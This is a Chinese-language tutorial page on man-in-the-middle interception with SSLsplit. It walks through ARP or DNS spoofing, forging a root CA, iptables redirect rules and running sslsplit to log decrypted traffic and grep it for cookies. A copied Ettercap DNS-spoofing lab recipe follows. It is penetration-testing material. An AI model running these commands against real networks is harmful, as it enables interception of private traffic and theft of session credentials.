---
title: sslsplit
date: 2016-03-29T21:25:45+08:00
update: 2016-01-01
categories: [网络安全]
tags:
---
<http://www.roe.ch/SSLsplit>
[](http://www.freebuf.com/sectool/48016.html)
[](http://blog.csdn.net/wizardforcel/article/details/52798019)
原文：http://blog.philippheckel.com/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/

mitmproxy对https连接的数据抓取很完美。但是，它不能理解其他基于TLS/SSL的流量，比如FTPS, SMTP over SSL, IMAP over SSL等。

SSLsplit 是一个通用的透明TLS/SSL代理， 可以执行中间人攻击。

使用SSLsplit,可以监听和保存所有基于SSL的流量

1.工作原理
SSLsplit同其他透明SSL代理工具类似：它扮演了一个在客户端和实际的服务器间的中间人。
所有的流量都被转向(redirect)到SSLsplit运行的那台服务器上（通过改变默认的网关， ARP欺骗或者其他方式)

2. 转向流量
1）使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。
你不需要物理访问受害者的设备就能做到。
2）手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法
3) DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。
4）修改受害者机器的/etc/hosts的条目来 转向某些域名的流量

改变受害者的默认网关，是最简单的方法。毕竟，我们为了安装CA证书到受害者机器上，也需要物理访问机器。

3. 安装
https://github.com/droe/sslsplit
Debian上目前只有sslsniff, 没有sslsplit

apt-get install libssl-dev libevent-dev
git clone https://github.com/droe/sslsplit
cd sslsplit
make
mkdir /tmp/sslsplit

在sslsplit目录下就生成了一个 可执行文件 sslsplit

4.生成CA证书

openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt -subj "/C=CN/ST=beijing/L=beijing/O=china/OU=baidu/CN=baidu"

第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key
第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)
这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。

5.启用IP转发和NAT引擎
假设SSLsplit运行在两个端口 8080用作非SSL的TCP连接，比如 http, smtp, ftp
8443 用作SSL的连接，比如SMTP over SSL, HTTPS等
为了转发 到达攻击者机器的IP到 互联网上的端口，可以这么设置

sysctl -w net.ipv4.ip_forward=1
1. ```
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
  HTTPS:
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
  SMTP server on port 465
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
  IMAP on port 143 or via IMAP over SSL on port 993
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
```
2. ```
sudo iptables -t nat -N SSLSPLIT
sudo iptables -t nat -A SSLSPLIT -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -A SSLSPLIT -p tcp --dport 443 -j REDIRECT --to-ports 8443

# enable
iptables -t nat -A PREROUTING -j SSLSPLIT

# disable
sudo iptables -t nat -D PREROUTING -j SSLSPLIT
```
mitmproxy sniffing into HTTPS only
sudo mitmproxy -T --host -e
sslstrip -a -k -f
sudo sslstrip -a -k -f -l 10000
-p , --post                       Log only SSL POSTs. (default)
-s , --ssl                        Log all SSL traffic to and from server.
-a , --all                        Log all SSL and HTTP traffic to and from server.
-l <port>, --listen=<port>        Port to listen on (default 10000).
-f , --favicon                    Substitute a lock favicon on secure requests.
-k , --killsessions               Kill sessions in progress.

mkdir -p /tmp/sslsplit/logdir/
6.运行SSLsplit
`sslsplit  -D  -l connections.log  -j /tmp/sslsplit/  -S logdir/  -k ca.key  -c ca.cer   ssl 0.0.0.0 8443   tcp 0.0.0.0 8080`
# ./sslsplit
  -D
  -l connections.log
  -j /tmp/sslsplit/
  -S logdir/
  -k ca.key
  -c ca.cer
   ssl 0.0.0.0 8443
   tcp 0.0.0.0 8080

-D Debug模式，用于输出SSLSplit状态，建议使用时加上
-l 日志文件
-j 指定log目录地址
-S 指定-j参数目录下需要记录截断GET、POST请求的子目录地址
-k 指定私钥key文件，进行欺骗
-c 指定Root CA证书文件
ssl IP 端口 指定ssl需要监听的端口
tcp IP 端口 指定tcp需要监听的端口

最后存储路径为： /tmp/sslsplit/logdir/
cat /tmp/sslsplit/logdir/*
tail -f /tmp/sslsplit/loggdir/* .log
查看Cookie: grep -r "Cookie:" ./

-D：这是在前台运行 SSLSplit，并不是守护进程，并带有详细的输出。
-l connections.log：这将每个连接的记录保存到当前目录的connections.log中。
-j /tmp/sslsplit：这用于建立jail directory目录，/tmp/sslsplit会作为 root（chroot）包含 SSLSplit 的环境。
-S logdir：这用于告诉 SSLSplit 将内容日志（所有请求和响应）保存到logdir（在jail目录中），并将数据保存到单独的文件中。
-k和-c：这用于指明和充当 CA 时，SSLSplit 所使用的私钥和证书。
ssl 0.0.0.0 8443：这告诉 SSLSplit 在哪里监听 HTTPS（或者其它加密协议）连接。要记住这是我们在上一章中使用 iptables 从 443 转发的接口。
tcp 0.0.0.0 8080：这告诉 SSLSplit 在哪里监听 HTTP 连接。要记住这是我们在上一章中使用 iptables 从 80 转发的接口。


mitmproxy 监听 https 比 sslsplit更方便


sslsplit -h
Usage: sslsplit [options...] [proxyspecs...]
 -c pemfile  use CA cert (and key) from pemfile to sign forged certs
 -k pemfile  use CA key (and cert) from pemfile to sign forged certs
 -C pemfile  use CA chain from pemfile (intermediate and root CA certs)
 -K pemfile  use key from pemfile for leaf certs (default: generate)
 -t certdir  use cert+chain+key PEM files from certdir to target all sites
						 matching the common names (non-matching: generate if CA)
 -w gendir   write leaf key and only generated certificates to gendir
 -W gendir   write leaf key and all certificates to gendir
 -O          deny all OCSP requests on all proxyspecs
 -P          passthrough SSL connections if they cannot be split because of
						 client cert auth or no matching cert and no CA (default: drop)
 -g pemfile  use DH group params from pemfile (default: keyfiles or auto)
 -G curve    use ECDH named curve (default: prime256v1)
 -Z          disable SSL/TLS compression on all connections
 -r proto    only support one of ssl3 tls10 tls11 tls12 (default: all)
 -R proto    disable one of ssl3 tls10 tls11 tls12 (default: none)
 -s ciphers  use the given OpenSSL cipher suite spec (default: ALL:-aNULL)
 -e engine   specify default NAT engine to use (default: pf)
 -E          list available NAT engines and exit
 -u user     drop privileges to user (default if run as root: nobody)
 -m group    when using -u, override group (default: primary group of user)
 -j jaildir  chroot() to jaildir (impacts sni proxyspecs, see manual page)
 -p pidfile  write pid to pidfile (default: no pid file)
 -l logfile  connect log: log one line summary per connection to logfile
 -L logfile  content log: full data to file or named pipe (excludes -S/-F)
 -S logdir   content log: full data to separate files in dir (excludes -L/-F)
 -F pathspec content log: full data to sep files with % subst (excl. -L/-S):
						 %T - initial connection time as an ISO 8601 UTC timestamp
						 %d - destination host and port
						 %D - destination host
						 %p - destination port
						 %s - source host and port
						 %S - source host
						 %q - source port
						 %x - base name of local process        (requires -i)
						 %X - full path to local process        (requires -i)
						 %u - user name or id of local process  (requires -i)
						 %g - group name or id of local process (requires -i)
						 %% - literal '%'
		 e.g.    "/var/log/sslsplit/%X/%u-%s-%d-%T.log"
 -i          look up local process owning each connection for logging
 -d          daemon mode: run in background, log error messages to syslog
 -D          debug mode: run in foreground, log debug messages on stderr
 -V          print version information and exit
 -h          print usage information and exit
 proxyspec = type listenaddr+port [natengine|targetaddr+port|"sni"+port]
		 e.g.    http 0.0.0.0 8080 www.roe.ch 80  # http/4; static hostname dst
						 https ::1 8443 2001:db8::1 443   # https/6; static address dst
						 https 127.0.0.1 9443 sni 443     # https/4; SNI DNS lookups
						 tcp 127.0.0.1 10025              # tcp/4; default NAT engine
						 ssl 2001:db8::2 9999 pf          # ssl/6; NAT engine 'pf'
						 autossl ::1 10025                # autossl/6; STARTTLS et al
Example:
 sslsplit -k ca.key -c ca.pem -P  https 127.0.0.1 8443  https ::1 8443

 8.6 执行 DNS 欺骗并重定向流量

 DNS 欺骗是一种攻击，其中执行 MITM 攻击的攻击者使用它来修改响应受害者的 DNS 服务器中的名称解析，发送给他们恶意页面，而不是他们请求的页面，但仍然使用有效名称。

 这个秘籍中，我们会使用 Ettercap 来执行 DNS 欺骗攻击，并在受害者打算浏览别的网站时，使其浏览我们的网站。
 准备

 对于这个秘籍，我们需要使用我们的 WIndows 客户端虚拟机，但是这次网络识别器桥接到 DNS 解析中。这个秘籍中它的 IP 地址为 192.168.71.14。

 攻击者的机器是我们的 Kali 主机，IP 为 192.168.71.8。它也需要运行 Apache 服务器，并拥有index.html演示页面，我们会包含下列东西：

 <h1>Spoofed SITE</h1>
 操作步骤

     假设我们已经启动了 Apache 服务器，并正确配置了伪造页面，让我们编辑/etc/ettercap/etter.dns，使它仅仅包含下面这一行：

     * A 192.168.71.8

     我们仅仅设置一条规则：所有 A 记录（地址记录）都解析到192.168.71.8，这是我们 Kali 的地址。我们可以设置其他条目，但是我们打算在这里避免干扰。

     这次，我们从命令行运行 Ettercap。打开 root 终端并键入下列命令：

     ettercap -i wlan0 -T -P dns_spoof -M arp /192.168.71.14///
         1
         1

     它会以文本模式运行 Ettercap，并开启 DNS 欺骗插件来执行 ARP 欺骗攻击，目标仅仅设置为192.168.71.14。

     启动攻击之后，我们来到客户端主机，并尝试通过网站自己的域名来浏览网站，例如，www.yahoo.com，像这样：

     要注意，现在地址和标签栏显示原始站点的名称，但是内容来自不同的地方。

     我们也可以尝试使用nslookup执行地址解析，像这样：

 工作原理

 这个秘籍中，我们看到如何使用中间人攻击来强制用户浏览某个页面，他们甚至相信自己在其它站点上。

 在第一步中，我们修改了 Ettercap 的名称解析文件，让它将所有请求的名称重定向到我们的 Kali 主机。

 之后，我们以下列参数运行 Ettercap：-i wlan0 -T -P dns_spoof -M arp /192.168.71.14///。

     -i wlan0：要技术我们需要客户端进行 DNS 解析，所以我们需要让它连接到桥接的适配器，并到达我们的 Kali 主机，所以我们将嗅探接口设为wlan0（攻击者计算机上的无线网卡）。

     -T：使用纯文本界面。

     -P dns_spoof：启动 DNS 欺骗插件。

     -M arp：执行 ARP 欺骗攻击。

     /192.168.71.14///：这是我们在命令行中对 Ettercap 设置目标的方式：MAC/ip_address/port。其中//表示任何对应 IP 192.168.71.14（客户端）任何端口的 MAC 地址。

 最后，我们确认了攻击能够正常工作。
 另见

 也有另一个非常实用的用于这些类型攻击的工具，叫做 dnsspoof。你应该下载下来并加入工具库：

 man dnsspoof

     1

     1

 http://www.monkey.org/~dugsong/dsniff/

 另一个值得提及的工具是中间人攻击框架：MITMf。它包含内建的 ARP 毒化、DNS 欺骗、WPAD 代理服务器，以及其它攻击类型的功能。

 mitmf --help
